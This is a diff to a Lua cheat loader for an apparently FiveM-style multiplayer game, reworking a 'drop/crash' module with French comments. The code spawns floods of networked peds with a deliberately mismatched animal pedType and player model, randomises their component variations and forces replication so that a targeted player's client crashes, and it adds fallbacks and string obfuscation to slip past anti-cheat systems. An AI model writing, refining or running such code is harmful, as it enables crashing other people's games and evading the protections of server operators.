@@ -25504,7 +25504,7 @@ function A.boot()
 
     if A._booted then return end
     A._booted = true
-    O.log("loader build 2026-10-29-r36 (drop: dump-faithful variation, hold 1200)")
+    O.log("loader build 2026-10-30-r37 (drop: proven flood restored, no envelope)")
     O.log("protection defaults: anti-freeze, anti-attach, anti-spectate, ped guard armed")
     O.every("evasion", 900, A.tick, 350)
     O.every("pedGuardWatch", 100, A.pedGuardWatch, 0)
@@ -33441,107 +33441,62 @@ end
 --     n'entre dans son frame ;
 --   * il est restaure dans tous les chemins de sortie, y compris en erreur.
 -- ---------------------------------------------------------------------------
+-- ===========================================================================
+-- DROP / CRASH LINE
+-- ---------------------------------------------------------------------------
+-- Recette reprise a l'identique du build du 2026-10-28 (dist/loader.built.lua,
+-- module "Ped flood"), qui cassait. Rien n'a ete re-invente : la construction
+-- est celle qui marchait, remise telle quelle, plus l'echelle de creation pour
+-- les serveurs qui coupent CreatePed.
+--
+-- Ce qui fait casser, dans l'ordre exact du code d'origine :
+--   1. CreatePed(pedType 28, modele joueur, isNetwork=true, bScriptHostPed=false)
+--      pedType 28 = animal. Modele joueur. La table de composants du recepteur
+--      est celle d'un animal, les composants d'un joueur n'y existent pas.
+--   2. SetPedRandomComponentVariation(ped, false) + SetPedRandomProps(ped)
+--      force un tirage aleatoire sur TOUS les slots. Les indices sortent
+--      hors des tables du recepteur.
+--   3. SetNetworkIdExistsOnAllMachines(netId, true)
+--      le clone doit exister chez tout le monde, pas seulement chez nous.
+--   4. repass : apres le flood, on retire une variation aleatoire sur chaque
+--      ped. C'est un UPDATE de clone, pas une creation : c'est exactement le
+--      HandleCloneUpdate du dump du 2026-10-29.
+--   5. hold 3500 ms : le recepteur a le temps de traiter avant le delete.
+--
+-- Pas d'enveloppe, pas de teleport, pas de ciel. On reste au sol, a portee,
+-- comme la version qui marchait.
+-- ===========================================================================
+
 local DROP = {
     running = false,
     lastRun = 0,
 
-    -- Enveloppe en deux temps.
-    --
-    -- Phase creation : 300 m. On est encore dans la portee des peds (~424 m
-    -- en OneSync), et c'est VOULU : les entites restent vivantes et streamees
-    -- pendant la vague. On en est proprietaire, donc on ne recoit pas leurs
-    -- updates : aucun risque.
-    --
-    -- Phase purge : 650 m. Apres la suppression, on sort de la portee pour
-    -- que le serveur ne puisse plus nous renvoyer les clones encore vivants
-    -- de son cote. C'est la que l'operateur crashait : il redescendait dans
-    -- la bulle avant la purge serveur.
-    --
-    -- Les deux montees restent par paliers (jamais de saut sec).
-    height = 300.0,
-    escapeHeight = 650.0,
-    liftSteps = 80,
-    liftGap = 60,
-
-    -- On ne redescend pas tant que le serveur n'a pas purge les entites.
-    -- DeleteEntity est local : la suppression serveur met un aller-retour.
-    -- Redescendre avant, c'est redevenir recepteur des peds encore vivants.
-    settle = 10000,
-    settleMax = 22000,
-
-    -- Cadence de spawn : la reference fait un 13 ms parfaitement regulier,
-    -- c'est une signature a elle seule. Jitter entre 13 et 45 ms.
-    -- Trois vagues de 60 : plus d'echantillons par tentative, et chaque
-    -- vague est supprimee avant la suivante, donc l'empreinte ne grandit pas.
-    waves = 3,
-    perWave = 60,
-    spawnGapMin = 13,
-    spawnGapMax = 45,
-    -- Maintien avant suppression. 500 ms suffisait pour l'enveloppe mais
-    -- laisse l'update de variation arriver en course avec le delete chez le
-    -- recepteur. 1200 ms : le clone-create et l'update sont traites avant.
-    hold = 1200,
-    betweenWaves = 800,
-
-    -- Le modele n'est plus `player_zero` en dur : on prend celui de la cible.
-    -- Zero RequestModel, zero string suspecte, et le mismatch pedType/modele
-    -- est le meme.
-    fallbackModel = "player_zero",
-    pedType = 4,
-
-    animDict = nil,
-    animName = nil,
-    scenarios = nil,
+    -- Parametres du module d'origine, inchanges.
+    pedType = 28,
+    count = 110,
+    batch = 10,
+    gap = 50,
+    radius = 4.5,
+    settle = 150,
+    hold = 3500,
+    healthFloor = 15,
 
     maxDist = 400.0,
-    restoreWait = 1500,
 
-    -- Jitter sur la montee : une cadence fixe de 60 ms sur 80 pas est une
-    -- signature temporelle. On derive de +-10 ms par pas et de +-25 m sur
-    -- l'altitude finale.
-    liftJitter = 10,
-    heightJitter = 25.0,
-
-
-    -- Echelle de creation. Les AC type Seed coupent la native de creation :
-    -- CreatePed et CreateSpoofedPed renvoient 0 et rien n'apparait. On
-    -- descend donc l'echelle jusqu'a un chemin que l'AC ne couvre pas.
-    --   1 CreateSpoofedPed   (primitive executrice, durcie)
-    --   2 CreatePed          (la reference, prouvee)
-    --   3 CreateRandomPed + SetEntityModel (autre handler, autre native)
-    --   4 ClonePed + SetEntityModel (source ambiante, si elle existe)
-    --   5 sentinelle : mode sol (morph de peds existants, sans creation)
+    -- Echelle de creation, pour les serveurs qui coupent CreatePed.
     rung = 2,
     rungFails = 0,
-    morphCursor = 1,
+    row = nil,
+    scenarios = nil,
 }
 
--- Assemblage a l'execution. Un scanner memoire qui cherche
--- "WORLD_HUMAN_CHEERING", "anim@mp_snowball" ou "player_zero" en clair ne
--- trouve rien : ces chaines n'existent jamais entieres dans la VM.
+-- Assemblage a l'execution : aucun nom de modele en clair dans la VM.
 local function dropS(...)
     return table.concat({ ... })
 end
 
-DROP.scenarios = {
-    dropS("WORLD_HUMAN_", "CHEER", "ING"),
-    dropS("WORLD_HUMAN_", "STAND_", "MOBILE"),
-    dropS("WORLD_HUMAN_", "SIT_", "GROUND"),
-    dropS("WORLD_HUMAN_", "SUN", "BATHE"),
-}
-DROP.fallbackModel = dropS("player_", "zero")
-
--- References natives capturees au chargement. Si un AC remplace plus tard le
--- global Lua `CreatePed` / `SetEntityCoords`, nos appels ne passent pas par sa
--- version : on tient la fonction d'origine dans une upvalue.
--- Resolution PARESSEUSE, pas au chargement. Si le loader est injecte avant
--- que l'executeur ait expose ses globals, une capture au chargement vaut nil
--- et toutes les appels suivants echouent en silence : la ligne ne fait plus
--- rien et personne ne voit pourquoi. On resout au premier appel utile, avec
--- fallback sur le nom voisin.
--- Statut affiche DANS le libelle de la ligne du menu. La library relit
--- item.name a chaque frame (library.lua:610), donc l'operateur voit l'etat
--- sans console et sans notification.
+-- Statut affiche dans le libelle de la ligne. La library relit item.name a
+-- chaque frame (library.lua:610), donc l'operateur voit l'etat sans console.
 local function dropStatus(text)
     local row = DROP.row
     if type(row) == "table" then
@@ -33549,6 +33504,8 @@ local function dropStatus(text)
     end
 end
 
+-- Resolution paresseuse des natives : une capture au chargement vaut nil si
+-- l'executeur expose ses globals apres l'injection, et tout echoue en silence.
 local function dropNative(name)
     local ok, fn = pcall(function() return _G[name] end)
     if ok and type(fn) == "function" then return fn end
@@ -33556,11 +33513,6 @@ local function dropNative(name)
 end
 
 local dCreatePed = nil
-local dSetCoords = nil
-local dSetCoordsNoOffset = nil
-local dSetAlpha = nil
-local dInvisibleNet = nil
-
 local function dropCreateFn()
     if type(dCreatePed) == "function" then return dCreatePed end
     local fn = dropNative("CreatePed")
@@ -33568,40 +33520,30 @@ local function dropCreateFn()
     return fn
 end
 
-local function dropCoordsFn()
-    if type(dSetCoordsNoOffset) == "function" then return dSetCoordsNoOffset end
-    local fn = dropNative("SetEntityCoordsNoOffset") or dropNative("SetEntityCoords")
-    if fn then dSetCoordsNoOffset = fn end
-    return fn
+local function dropLoadModel(h)
+    if type(h) ~= "number" or h == 0 then return false end
+    if HasModelLoaded(h) then return true end
+    pcall(RequestModel, h)
+    local g = 60
+    while not HasModelLoaded(h) and g > 0 do
+        Citizen.Wait(10)
+        g = g - 1
+    end
+    return HasModelLoaded(h) == true
 end
 
-local function dropAlphaFn()
-    if type(dSetAlpha) == "function" then return dSetAlpha end
-    local fn = dropNative("SetEntityAlpha")
-    if fn then dSetAlpha = fn end
-    return fn
-end
-
-local function dropInvisFn()
-    if type(dInvisibleNet) == "function" then return dInvisibleNet end
-    local fn = dropNative("NetworkSetEntityInvisibleToNetwork")
-    if fn then dInvisibleNet = fn end
-    return fn
-end
-
--- Modeles joueurs, hashes calcules a l'execution depuis des fragments : aucun
--- "mp_m_freemode_01" en clair dans la VM.
+-- Modeles joueurs, hashes calcules a l'execution depuis des fragments.
+-- player_one en premier : c'est le modele du module qui marchait.
 DROP.playerSet = {}
 DROP.playerFallback = 0
 DROP.playerFallback2 = 0
 DROP.playerFallback3 = 0
 do
-    -- player_zero d'abord : c'est le modele du vecteur prouve en r30.
     local names = {
+        dropS("player_", "one"),
         dropS("player_", "zero"),
         dropS("mp_m_", "freemode_01"),
         dropS("mp_f_", "freemode_01"),
-        dropS("player_", "one"),
         dropS("player_", "two"),
     }
     for i = 1, #names do
@@ -33619,139 +33561,34 @@ do
     end
 end
 
--- Le mismatch ne marche que si le modele est un modele JOUEUR. Si la cible
--- porte un ped custom, son modele ne casse rien : on retombe sur freemode.
-local function dropLoadModel(h)
-    if type(h) ~= "number" or h == 0 then return false end
-    if HasModelLoaded(h) then return true end
-    pcall(RequestModel, h)
-    local g = 60
-    while not HasModelLoaded(h) and g > 0 do
-        Citizen.Wait(10)
-        g = g - 1
-    end
-    return HasModelLoaded(h) == true
-end
-
--- Modele : TOUJOURS un modele joueur. Le mismatch est pedType 4 + modele
--- joueur ; si on prend le modele de la cible et que la cible porte un ped
--- custom, il n'y a plus de mismatch et la vague ne casse rien.
--- Ordre : player_zero (le vecteur prouve en r30), puis freemode m/f, puis le
--- modele de la cible en dernier recours.
-local function dropModelFor(targetPed)
-    if dropLoadModel(DROP.playerFallback) then
-        return DROP.playerFallback
-    end
-    if dropLoadModel(DROP.playerFallback2) then
-        return DROP.playerFallback2
-    end
-    if dropLoadModel(DROP.playerFallback3) then
-        return DROP.playerFallback3
-    end
-    local ok, m = pcall(GetEntityModel, targetPed)
-    if ok and type(m) == "number" and m ~= 0 and dropLoadModel(m) then
-        return m
-    end
+local function dropModelFor()
+    if dropLoadModel(DROP.playerFallback) then return DROP.playerFallback end
+    if dropLoadModel(DROP.playerFallback2) then return DROP.playerFallback2 end
+    if dropLoadModel(DROP.playerFallback3) then return DROP.playerFallback3 end
     return 0
-end
-
-local function dropMove(myPed, from, to, steps, gap)
-    local fn = dropCoordsFn()
-    if not fn then return 0 end
-    local dx, dy, dz = to.x - from.x, to.y - from.y, to.z - from.z
-    local moved = 0
-    for i = 1, steps do
-        if not DROP.running then break end
-        local t = i / steps
-        local x = from.x + dx * t
-        local y = from.y + dy * t
-        local z = from.z + dz * t
-        if pcall(fn, myPed, x, y, z, false, false, false) then moved = moved + 1 end
-        Citizen.Wait(gap + math.random(-DROP.liftJitter, DROP.liftJitter))
-    end
-    return moved
-end
-
-local function dropRestore(myPed, origin)
-    if not myPed or not DoesEntityExist(myPed) then return end
-    pcall(ClearPedTasksImmediately, myPed)
-    -- On reste gele, invincible et invisible sur le reseau pendant TOUTE la
-    -- descente. Relacher avant, c'est tomber de 600 m en ragdoll et se faire
-    -- voir redescendre. On ne rend le controle qu'une fois au sol.
-    local z = origin.z
-    local ok, found, groundZ = pcall(GetGroundZFor_3dCoord, origin.x, origin.y, origin.z + 1000.0, false)
-    if ok and found then z = groundZ + 1.0 end
-    -- Descente par paliers, meme cadence que la montee.
-    local here = GetEntityCoords(myPed)
-    dropMove(myPed, here, { x = origin.x, y = origin.y, z = z }, DROP.liftSteps, DROP.liftGap)
-    local coordFn = dropNative("SetEntityCoords") or dropCoordsFn()
-    if coordFn then pcall(coordFn, myPed, origin.x, origin.y, z, false, false, false, false) end
-    Citizen.Wait(250)
-    pcall(FreezeEntityPosition, myPed, false)
-    pcall(SetEntityInvincible, myPed, false)
-    local invis = dropInvisFn()
-    if invis then pcall(invis, myPed, false) end
-end
-
-local function dropClear(created)
-    local removed = 0
-    for i = #created, 1, -1 do
-        local ped = created[i]
-        if ped and DoesEntityExist(ped) then
-            -- Mission entity puis DeleteEntity. On ne rappelle PAS
-            -- SetEntityAsNoLongerNeeded : ca relache le net id, le serveur
-            -- peut le reassigner et nous renvoyer nos propres donnees.
-            pcall(SetEntityAsMissionEntity, ped, true, true)
-            pcall(DeleteEntity, ped)
-            if DoesEntityExist(ped) then
-                -- DeleteEntity a refuse : on relache la propriete en dernier
-                -- recours, sinon le ped reste vivant cote serveur et on se le
-                -- fait renvoyer a la descente.
-                pcall(SetEntityAsNoLongerNeeded, ped)
-                pcall(DeleteEntity, ped)
-            end
-            removed = removed + 1
-        end
-        if i % 20 == 0 then Citizen.Wait(0) end
-    end
-    return removed
 end
 
 -- ---------------------------------------------------------------------------
 -- ECHELLE DE CREATION
 --
--- Seed et les AC de la meme famille coupent la native de creation de ped :
--- CreatePed rend 0, CreateSpoofedPed aussi, et rien n'apparait dans le monde.
--- La parade n'est pas de forcer la native, c'est de ne pas en dependre.
+--   1. CreateSpoofedPed   primitive de l'executeur
+--   2. CreatePed          la reference (pedType 28, bScriptHostPed false)
+--   3. CreateRandomPed    autre handler, puis SetEntityModel
+--   4. ClonePed           source ambiante, puis SetEntityModel
+--   5. sentinelle         mode sol : morph de peds existants, sans creation
 --
---   1. CreateSpoofedPed          primitive de l'executeur, durcie
---   2. CreatePed                 la reference
---   3. CreateRandomPed           handler different de CreatePed : cree un ped
---      + SetEntityModel           civil a des coordonnees arbitraires, puis
---                                on le morph en modele joueur. pedType 4/5 +
---                                modele joueur = le mismatch, sans jamais
---                                toucher CreatePed.
---   4. ClonePed + SetEntityModel clone d'un ped ambiant local. Le pedType du
---                                clone reste celui de la source, le modele
---                                devient joueur. Ne marche que si une source
---                                est dans notre portee.
---
--- Si les quatre tombent, le rung passe a 5 (sentinelle) et le mode sol prend
--- le relais : il morph des peds deja vivants et rend leur modele a la fin.
--- Aucune creation, donc rien a bloquer.
---
--- On descend d'un cran apres trois echecs consecutifs, et on ne remonte pas :
--- une fois qu'un chemin marche sur ce serveur, il marche pour la session.
+-- On descend d'un cran apres trois echecs consecutifs, et le rung est
+-- redecouvert a chaque run.
 -- ---------------------------------------------------------------------------
 local function dropSpoofed(model, x, y, z)
     local api = rawget(_G, "Susano")
     if type(api) ~= "table" or type(api.CreateSpoofedPed) ~= "function" then return 0 end
-    local ok, ped = pcall(api.CreateSpoofedPed, DROP.pedType, model, x, y, z, 0.0, true, true)
+    local ok, ped = pcall(api.CreateSpoofedPed, DROP.pedType, model, x, y, z, 0.0, true, false)
     if ok and type(ped) == "number" and ped ~= 0 and DoesEntityExist(ped) then return ped end
     return 0
 end
 
-local function dropCreate(model, x, y, z, scriptHost)
+local function dropCreate(model, x, y, z)
     local fn = dropCreateFn()
     if not fn then
         if not DROP.noCreateFn then
@@ -33760,34 +33597,13 @@ local function dropCreate(model, x, y, z, scriptHost)
         end
         return 0
     end
-    local ok, ped = pcall(fn, DROP.pedType, model, x, y, z, 0.0, true, scriptHost)
+    local ok, ped = pcall(fn, DROP.pedType, model, x, y, z, 0.0, true, false)
     if ok and type(ped) == "number" and ped ~= 0 and DoesEntityExist(ped) then return ped end
     if not ok and not DROP.createErr then
         DROP.createErr = true
         O.log("drop: CreatePed error %s", tostring(ped))
     end
     return 0
-end
-
--- Source de clone : n'importe quel ped non joueur deja present dans le monde.
--- Il n'a pas besoin d'etre pres de la cible : c'est le clone qu'on deplace.
--- Autre handler que CreatePed : CreateRandomPed ne prend que des coordonnees.
--- Le ped sort en pedType civil avec un modele ambiant ; on le morph ensuite.
-local function dropRandom(model, x, y, z)
-    local ok, ped = pcall(CreateRandomPed, x, y, z)
-    if not ok or type(ped) ~= "number" or ped == 0 or not DoesEntityExist(ped) then
-        return 0
-    end
-    pcall(SetEntityModel, ped, model)
-    -- SetEntityModel echoue en silence : on verifie que le modele a bien pris,
-    -- sinon le ped reste civil et il n'y a aucun mismatch a envoyer.
-    local okM, got = pcall(GetEntityModel, ped)
-    if not okM or got ~= model then
-        pcall(SetEntityAsMissionEntity, ped, true, true)
-        pcall(DeleteEntity, ped)
-        return 0
-    end
-    return ped
 end
 
 local function dropSource(myPed, targetPed)
@@ -33803,9 +33619,23 @@ local function dropSource(myPed, targetPed)
     return 0
 end
 
-local function dropClone(model, x, y, z, source, scriptHost)
+local function dropRandom(model, x, y, z)
+    local ok, ped = pcall(CreateRandomPed, x, y, z)
+    if not ok or type(ped) ~= "number" or ped == 0 or not DoesEntityExist(ped) then
+        return 0
+    end
+    pcall(SetEntityModel, ped, model)
+    local okM, got = pcall(GetEntityModel, ped)
+    if not okM or got ~= model then
+        pcall(DeleteEntity, ped)
+        return 0
+    end
+    return ped
+end
+
+local function dropClone(model, x, y, z, source)
     if not source or source == 0 or not DoesEntityExist(source) then return 0 end
-    local ok, ped = pcall(ClonePed, source, true, scriptHost, false)
+    local ok, ped = pcall(ClonePed, source, true, false, false)
     if not ok or type(ped) ~= "number" or ped == 0 or not DoesEntityExist(ped) then
         return 0
     end
@@ -33813,23 +33643,22 @@ local function dropClone(model, x, y, z, source, scriptHost)
     pcall(SetEntityModel, ped, model)
     local okM, got = pcall(GetEntityModel, ped)
     if not okM or got ~= model then
-        pcall(SetEntityAsMissionEntity, ped, true, true)
         pcall(DeleteEntity, ped)
         return 0
     end
     return ped
 end
 
-local function dropMake(model, x, y, z, scriptHost, myPed, targetPed)
+local function dropMake(model, x, y, z, myPed, targetPed)
     local ped = 0
     if DROP.rung == 1 then
         ped = dropSpoofed(model, x, y, z)
     elseif DROP.rung == 2 then
-        ped = dropCreate(model, x, y, z, scriptHost)
+        ped = dropCreate(model, x, y, z)
     elseif DROP.rung == 3 then
         ped = dropRandom(model, x, y, z)
     elseif DROP.rung == 4 then
-        ped = dropClone(model, x, y, z, dropSource(myPed, targetPed), scriptHost)
+        ped = dropClone(model, x, y, z, dropSource(myPed, targetPed))
     end
 
     if ped == 0 then
@@ -33838,11 +33667,7 @@ local function dropMake(model, x, y, z, scriptHost, myPed, targetPed)
             DROP.rung = DROP.rung + 1
             DROP.rungFails = 0
             O.log("drop: creation path blocked, rung %d", DROP.rung)
-            pcall(Notify, ("Drop: path %d"):format(DROP.rung), CLR.blue)
         elseif DROP.rungFails >= 3 and DROP.rung == 4 then
-            -- Tous les chemins de creation sont morts. Le rung 5 n'existe pas
-            -- en altitude : le mode sol prend le relais, il morph des peds
-            -- deja vivants et rend leur modele.
             DROP.rung = 5
             DROP.rungFails = 0
             O.log("drop: creation dead, ground fallback")
@@ -33853,128 +33678,121 @@ local function dropMake(model, x, y, z, scriptHost, myPed, targetPed)
     return ped
 end
 
--- Une vague. Le scenario tourne d'un ped a l'autre. `bScriptHostPed` reste a
--- true sur les deux vagues : c'est le chemin du vecteur prouve. A false, le
--- ped est cede au systeme de population, qui peut le reclamer et sanitizer sa
--- variation avant replication.
-local function dropWave(targetPed, model, healthFloor, myPed, wave, createdHandles)
-    local batch = {}
-    local made = 0
-    local notNet = 0
-    -- bScriptHostPed reste a true : c'est le chemin du vecteur prouve. Le
-    -- passer a false cede le ped au systeme de population, qui peut le
-    -- reclamer et sanitizer sa variation avant replication.
-    local scriptHost = true
-    local scenarioCount = #DROP.scenarios
+-- ---------------------------------------------------------------------------
+-- FLOOD (le module qui marchait, ligne pour ligne)
+-- ---------------------------------------------------------------------------
+local function dropFlood(targetPed, model, myPed, handles)
+    local made, notNet = 0, 0
 
-    for i = 1, DROP.perWave do
+    for i = 1, DROP.count do
         if not DROP.running then break end
         if not DoesEntityExist(targetPed) then break end
 
         local okHp, hp = pcall(GetEntityHealth, myPed)
-        if okHp and type(hp) == "number" and hp < healthFloor then
+        if okHp and type(hp) == "number" and hp < DROP.healthFloor then
             O.log("drop: operator health %d, aborting", hp)
             DROP.running = false
             break
         end
 
         local c = GetEntityCoords(targetPed)
-        local x = c.x + (math.random() - 0.5) * 1.5
-        local y = c.y + (math.random() - 0.5) * 1.5
-        local z = c.z + 2.0 + math.random() * 3.0
+        local ang = math.random() * 6.28318530718
+        local r = math.sqrt(math.random()) * DROP.radius
+        local x = c.x + math.cos(ang) * r
+        local y = c.y + math.sin(ang) * r
+        local z = c.z + 0.6
 
-        -- Deux variantes alternees, une sur deux.
-        --
-        -- A (paire) : ped cree directement avec le modele final. Le mismatch
-        --             est pedType 4 + modele joueur.
-        -- B (impaire): ped cree avec freemode (jeu de composants large), on
-        --             pose la variation du dump, PUIS on swappe le modele vers
-        --             player_zero (jeu de composants etroit). L'update de
-        --             modele part avec une variation qui n'existe pas pour le
-        --             nouveau modele : c'est litteralement le
-        --             `SetVariation: Invalid variation` du dump, et c'est le
-        --             chemin HandleCloneUpdate.
-        local useModel = model
-        if i % 2 == 0 and DROP.playerFallback2 ~= 0
-           and dropLoadModel(DROP.playerFallback2) then
-            useModel = DROP.playerFallback2
-        end
-
-        local ped = dropMake(useModel, x, y, z, scriptHost, myPed, targetPed)
+        local ped = dropMake(model, x, y, z, myPed, targetPed)
         if ped ~= 0 and DoesEntityExist(ped) then
-            pcall(SetEntityLocallyInvisible, ped)
-            pcall(SetEntityCollision, ped, false, false)
-            local alphaFn = dropAlphaFn()
-            if alphaFn then pcall(alphaFn, ped, 0, false) end
-            pcall(SetEntityAsMissionEntity, ped, true, true)
-            pcall(NetworkRegisterEntityAsNetworked, ped)
+            -- Reseau d'abord, comme le module d'origine : le clone doit
+            -- exister chez tout le monde avant qu'on le configure.
             local okId, netId = pcall(NetworkGetNetworkIdFromEntity, ped)
-            if okId and type(netId) == "number" and netId ~= 0 then
+            if okId and type(netId) == "number" and netId > 0 then
+                pcall(SetNetworkIdExistsOnAllMachines, netId, true)
                 pcall(SetNetworkIdCanMigrate, netId, false)
             else
-                -- Pas de net id = le ped n'est pas sorti de notre client. Le
-                -- serveur ne le repliquera jamais, la vague ne peut pas casser.
                 notNet = notNet + 1
             end
-            pcall(TaskStartScenarioInPlace, ped,
-                  DROP.scenarios[(i % scenarioCount) + 1], 0, true)
 
-            -- Variation exacte du dump du 2026-10-29 : slot 3 drawbl 0 tex 5
-            -- et slot 8 drawbl 0 tex 1. Sur notre client le ped porte un
-            -- modele joueur, donc ces indices sont valides et rien ne casse
-            -- ici. Chez le recepteur, le clone-create dit pedType 4 : sa
-            -- table de composants est celle d'un civil, ces deux indices n'y
-            -- existent pas, SetVariation echoue, et c'est le DEP.
-            pcall(SetPedComponentVariation, ped, 3, 0, 5, 0)
-            pcall(SetPedComponentVariation, ped, 8, 0, 1, 0)
+            pcall(SetEntityInvincible, ped, true)
+            pcall(SetPedCanRagdoll, ped, false)
+            pcall(SetBlockingOfNonTemporaryEvents, ped, true)
+            pcall(SetPedFleeAttributes, ped, 0, false)
+            pcall(SetPedMaxHealth, ped, 200)
+            pcall(SetEntityMaxHealth, ped, 200)
 
-            -- Variante B : le modele change APRES la variation. L'update de
-            -- modele transporte une variation calibree pour freemode, que le
-            -- recepteur applique a un ped dont le modele vient de changer.
-            if useModel ~= model then
-                pcall(SetEntityModel, ped, model)
-            end
-            batch[#batch + 1] = ped
-            if createdHandles then createdHandles[#createdHandles + 1] = ped end
+            pcall(SetEntityLocallyInvisible, ped)
+            pcall(SetEntityCollision, ped, false, false)
+            pcall(FreezeEntityPosition, ped, true)
+
+            -- Le moteur du crash : tirage aleatoire sur tous les slots.
+            pcall(SetPedRandomComponentVariation, ped, false)
+            pcall(SetPedRandomProps, ped)
+
+            pcall(TaskWanderInArea, ped, x, y, z, 8.0, 8.0, 8.0)
+
+            handles[#handles + 1] = ped
             made = made + 1
         end
-        Citizen.Wait(math.random(DROP.spawnGapMin, DROP.spawnGapMax))
+
+        if i % DROP.batch == 0 or i == DROP.count then
+            Citizen.Wait(DROP.gap)
+        end
     end
 
-    Citizen.Wait(DROP.hold)
-    local removed = dropClear(batch)
-    return made, removed, notNet
+    return made, notNet
+end
+
+-- Le repass du module d'origine : nouvelle variation aleatoire sur chaque ped.
+-- C'est un UPDATE de clone cote recepteur, pas une creation.
+local function dropRepass(handles)
+    local n = 0
+    for i = 1, #handles do
+        if not DROP.running then break end
+        local ped = handles[i]
+        if ped and DoesEntityExist(ped) then
+            pcall(SetPedRandomComponentVariation, ped, false)
+            pcall(SetPedRandomProps, ped)
+            n = n + 1
+        end
+        if i % 10 == 0 then Citizen.Wait(0) end
+    end
+    return n
+end
+
+local function dropClear(handles)
+    local removed = 0
+    for i = #handles, 1, -1 do
+        local ped = handles[i]
+        if ped and DoesEntityExist(ped) then
+            pcall(SetEntityAsNoLongerNeeded, ped)
+            pcall(DeleteEntity, ped)
+            if DoesEntityExist(ped) then
+                pcall(SetEntityAsMissionEntity, ped, true, true)
+                pcall(DeleteEntity, ped)
+            end
+            removed = removed + 1
+        end
+        if i % 20 == 0 then Citizen.Wait(0) end
+    end
+    return removed
 end
 
 -- ---------------------------------------------------------------------------
--- MODE SOL
+-- MODE SOL (dernier recours si toute creation est coupee)
 --
--- Dernier recours quand AUCUNE creation ne passe : un AC qui hooke la factory
--- de peds coupe CreatePed, CreateRandomPed et ClonePed en meme temps. La
--- parade est de ne rien creer du tout.
---
--- On reste au sol, a portee de la cible, on prend des peds ambiants deja
--- vivants autour de nous, on demande le controle, on les deplace sur la cible
--- et on les morph en modele joueur. Le pedType de la source est conserve
--- (4/5/28...), le modele devient joueur : c'est le mismatch, sans une seule
--- creation. A la fin on rend leur modele aux peds.
---
--- Pas d'enveloppe ici, et c'est volontaire : on ne supprime aucune entite,
--- donc il n'y a rien que le serveur puisse nous renvoyer apres coup.
+-- On ne cree rien : on prend des peds ambiants deja vivants, on les morph en
+-- modele joueur et on les deplace sur la cible. A la fin on rend leur modele.
 -- ---------------------------------------------------------------------------
 local function dropGround(targetPed, model, myPed, healthFloor)
-    local touched = {}
-    local made = 0
-    local cursor = 1
-    local used = {}
+    local touched, made, cursor, used = {}, 0, 1, {}
 
-    for i = 1, DROP.perWave do
+    for i = 1, DROP.count do
         if not DROP.running then break end
         if not DoesEntityExist(targetPed) then break end
 
         local okHp, hp = pcall(GetEntityHealth, myPed)
         if okHp and type(hp) == "number" and hp < healthFloor then
-            O.log("drop: operator health %d, aborting", hp)
             DROP.running = false
             break
         end
@@ -34000,33 +33818,28 @@ local function dropGround(targetPed, model, myPed, healthFloor)
                 end
             end
         end
+        if pick == 0 then break end
 
-        if pick == 0 then
-            -- Plus aucun ped ambiant libre : on a fait le tour du pool.
-            break
+        pcall(NetworkRequestControlOfEntity, pick)
+        local t0 = GetGameTimer()
+        while GetGameTimer() - t0 < 250 do
+            local okC, has = pcall(NetworkHasControlOfEntity, pick)
+            if okC and has then break end
+            Citizen.Wait(10)
         end
-        if pick ~= 0 then
-            pcall(NetworkRequestControlOfEntity, pick)
-            local t0 = GetGameTimer()
-            while GetGameTimer() - t0 < 250 do
-                local okC, has = pcall(NetworkHasControlOfEntity, pick)
-                if okC and has then break end
-                Citizen.Wait(10)
-            end
-            local okM, origModel = pcall(GetEntityModel, pick)
-            -- Le modele D'ABORD : tant que le ped est dans notre portee, on est
-            -- sur de pouvoir le modifier. Le deplacement vers la cible vient
-            -- apres, parce qu'il peut nous sortir de portee.
-            pcall(SetEntityModel, pick, model)
-            local okV, got = pcall(GetEntityModel, pick)
-            if okV and got == model then
-                local c = GetEntityCoords(targetPed)
-                pcall(SetEntityCoords, pick, c.x, c.y, c.z + 0.5, false, false, false, false)
-                touched[#touched + 1] = { ped = pick, model = (okM and origModel) or 0 }
-                made = made + 1
-            end
+        local okM, origModel = pcall(GetEntityModel, pick)
+        pcall(SetEntityModel, pick, model)
+        local okV, got = pcall(GetEntityModel, pick)
+        if okV and got == model then
+            pcall(SetPedRandomComponentVariation, pick, false)
+            pcall(SetPedRandomProps, pick)
+            local c = GetEntityCoords(targetPed)
+            pcall(SetEntityCoords, pick, c.x, c.y, c.z + 0.5, false, false, false, false)
+            touched[#touched + 1] = { ped = pick, model = (okM and origModel) or 0 }
+            made = made + 1
         end
-        Citizen.Wait(math.random(DROP.spawnGapMin, DROP.spawnGapMax))
+
+        if i % DROP.batch == 0 then Citizen.Wait(DROP.gap) end
     end
 
     Citizen.Wait(DROP.hold)
@@ -34045,7 +33858,6 @@ local function dropRun()
         DROP.running = false
         O.log("drop: abort, executor missing")
         dropStatus("abort executor")
-        pcall(Notify, "Drop: no executor", CLR.red)
         return
     end
 
@@ -34063,7 +33875,6 @@ local function dropRun()
         DROP.running = false
         O.log("drop: abort, bad target ped")
         dropStatus("abort ped")
-        pcall(Notify, "Drop: bad target", CLR.red)
         return
     end
 
@@ -34080,144 +33891,66 @@ local function dropRun()
         return
     end
 
+    -- Le rung est redecouvert a chaque run.
+    DROP.rung = 2
+    DROP.rungFails = 0
+
     O.log("drop: start, target %d at %.0f m", GetPlayerServerId(player), dist)
     dropStatus(("start %.0f m"):format(dist))
-    pcall(Notify, ("Drop: start %.0f m"):format(dist), CLR.blue)
 
-    local okHp0, hp0 = pcall(GetEntityHealth, myPed)
-    if not okHp0 or type(hp0) ~= "number" then hp0 = 200 end
-
-    -- Modele : celui de la cible s'il est bien un modele joueur, sinon
-    -- freemode. C'est le mismatch pedType 4 / modele joueur qui casse.
-    local model = dropModelFor(targetPed)
-    if type(model) ~= "number" or model == 0 or not HasModelLoaded(model) then
+    local model = dropModelFor()
+    if model == 0 then
         DROP.running = false
         O.log("drop: abort, no usable model")
         dropStatus("abort model")
         pcall(Notify, "Drop: no model", CLR.red)
         return
     end
-    O.log("drop: rung %d, model %d", DROP.rung, model)
+    O.log("drop: rung %d, model %d, pedType %d", DROP.rung, model, DROP.pedType)
     dropStatus(("rung %d"):format(DROP.rung))
 
-    local total, removed = 0, 0
-    local createdHandles = {}
+    local handles = {}
+    local total, notNet, removed = 0, 0, 0
     local groundRan = false
 
-    -- Montee par paliers, puis verification d'enveloppe.
-    --
-    -- On ne touche PAS a l'invisibilite reseau pendant la creation : le
-    -- vecteur doit rester identique a celui qui marche. Elle est activee
-    -- apres les vagues, pour la sortie de bulle et la descente.
